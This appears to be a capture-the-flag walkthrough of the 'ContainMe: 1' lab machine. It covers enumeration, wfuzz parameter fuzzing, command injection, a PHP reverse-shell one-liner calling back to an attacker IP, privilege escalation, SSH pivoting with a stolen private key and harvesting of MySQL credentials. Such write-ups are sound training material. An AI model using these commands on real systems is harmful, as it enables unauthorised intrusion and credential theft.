# ContainMe: 1
First step as always is to run a nmap scan to see what ports are currently open on the victim machine.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/4f30bd1c-6707-47cb-a7e0-8d7001ddd0c7" />

I will then paste the IP in Firefox to see what the web app. Looks like it is the Apache2 Ubuntu default page.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/3d487f19-3ff0-4e1c-b11e-1418e8801cb6" />

Now that I know what I'm working with, I ran a gobuster command to check for any hidden directories. I ran the following command in my terminal: **gobuster dir -u http://192.168.146.132/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip**

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/ad994f22-da01-4327-afb6-21d8997efdb1" />

From here, I appended each directory to the web app URL to see what would be displayed. I started with **/info.php** first which gave information about php.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/6175f999-8407-4c41-9f26-293b8b71d8a5" />

I then appended **/index/php** to the URL and it looks like some content of the web-root directory.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/dbd2b343-5a7c-4154-ada5-d4f9778d227e" />

As per most web app attacks, it's important to check the source code to see if any comments were left behind that the developer forgot to remove that can be used as clues. After looking at the source code for the **/index.php**, I saw a comment about a path. I checked to see if this word could be used as a parameter to find the location of more files. 

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/2d7fab78-2f2d-43fe-a384-a62568d2890c" />

This worked out perfectly! 

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/85701555-7cff-435c-b1de-49cbeaab8e7a" />

Okay, now I'll have to fuzz different parameters with the same value that are appended to the URL What this does is it tries a list of common parameter names on index.php, ignores the normal response, and shows me only parameters that cause a different response. This will allow for a RCE attack. The command I ran was **wfuzz  --filter 'h!=329' -c -w /usr/share/dirb/wordlists/common.txt  http://192.168.146.132/index.php?FUZZ=a**. The wfuzz runs the fuzzer. The -w /usr/share/dirb/wordlists/common.txt uses the common dirb wordlist as payloads. Each word replaces FUZZ. The IP is the target URL and I am changing the parameter names, not values of the parameters. The --filter 'h!=329'shows the number of response lines and hides responses that have exactly 329 lines. This is because 329 lines is the default response for invalid parameters and any parameter that changes server behavior will usually change response size. So the only path available is **path**.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/743c0452-f401-4a33-a102-c6b0a9e09f6e" />

Now using Burp, I can capture the HTTP request to send to **http://192.168.146.132/index.php?path=/** for a deeper look into this. 

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/b900eab8-5c76-404c-9f2b-fe43c9fcf0fc" />

At this point, I wanted to try a couple different packet modifications to see what would return. This was the first packet I sent to the server where I changed it to a POST request and isolated the **path=/**. Nothing was returned that was different from what I was already seeing.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/218fdcd0-fa93-44de-b2e4-4472f5055eb8" />

I then reverted back to a GET request and used **;id** as the value to the path parameter which actually returned a bash file.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/19a33b6e-0674-4932-bed2-0f522de6709b" />

Then I made a malicious .elf file using msfvenom and uploaded that using curl:

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/c2ebba41-75a3-44f3-addd-359ed26dd67f" />

My attempt to generate a reverse shell didn't go as planned so I did pivot. I found a command injection python script online that I ended up using to try and generate a shell:

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/6361d10d-d2dc-470f-a358-fec782f7dadb" />

I started a ncat listener with the command **nc -nlvp 444** and ran this reverse shell sciprt **php -r '$sock=fsockopen("192.168.146.128",4444);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'** and it worked.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/1268ec20-1a54-4f04-9c85-a5f853c108d9" />

I just now need to make it an interactive shell so I will run the command **python3 -c 'import pty; pty.spawn("/bin/bash")'** which makes this much easier.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/baa25c8c-4bb2-45bd-8268-01ca47b90f58" />

I ran the **ls /home** command again just to verify that I'd see mike's user there which I did. I then ran **cd /home/mike** to enter mike.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/fdefecd5-22e5-4f87-b812-a5ecd915e5fe" />

I ran **ls -la** to check what files were under mike's directory and I saw an interesting name for a file **1cryptupx**. I ended up running **./1cryptupx mike** and this is what came up.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/3c4b4e4f-09a6-4e59-bebe-884a4a8bd4fb" />

So there is a file that I can execute. A good command is to find the 4000 permissions that www-data has. Now I know the location of the executable file that I can run as user mike. The root folder dosen't contain anything good but the interesting thing is the host1. That means that ther has to be at least one other machine in the network. I can ping the whole subnet (because nmap dosen't work) and see who will respond. I first check the IP address and then I ping the /24 subnet with a for loop that pings the hosts.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/99f75608-1fd8-4925-9426-60a428c2f730" />

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/4acf30dd-6e43-42eb-ab89-42e6e5a09eec" />

I can see the subnet is **172.16.20.2/24**. I then ran a for loop **for i in {1..254} ;do (ping -c 1 172.16.20.$i | grep "bytes from" &) ;done**. I found the other machine in the subnet **172.16.20.6**. Now I have a host and I can also check for the id_rsa file that is located under the /home/mike/.ssh/id_rsa path. The reason that I can see it now is because I am root on host1 which was mentioned before. I did some more maneuvering around the directory and ran **ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6** to ssh into host2 in the subnet.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/10c5f2ec-7fb5-4477-b694-b8c3911820d7" />

Now that I am in host2, I ran a **netstat -tulnup** command to see if there were any active connections. I can see port 3306 was up and running which is a mysql DB. 

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/ce05f19e-51c7-4c9b-89e9-a99e0fcbfe52" />

I logged into mike's mysql account using this command **mysql -u mike -p** and then **password** as the password and it worked. 

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/77a23e24-75d6-44c2-bfb9-5275cf74bbbc" />

I moved kept digging deeper and deeper into the users DB and found passwords for the root user and mike.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/32ca6701-68e4-4ee3-a699-aa4df4318143" />


I then used the command **su root** to enter the root account and entered the password located in the DB. I then ran **ls -la** and found a zip file with Mike's name. I ran **unzip mike.zip** and then entered mike's password from the DB which gave me a file named mike. I then ran **cat mike** and found the flag.

<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/c9f0091d-192d-43db-a6e5-f8b48d11cc6e" />
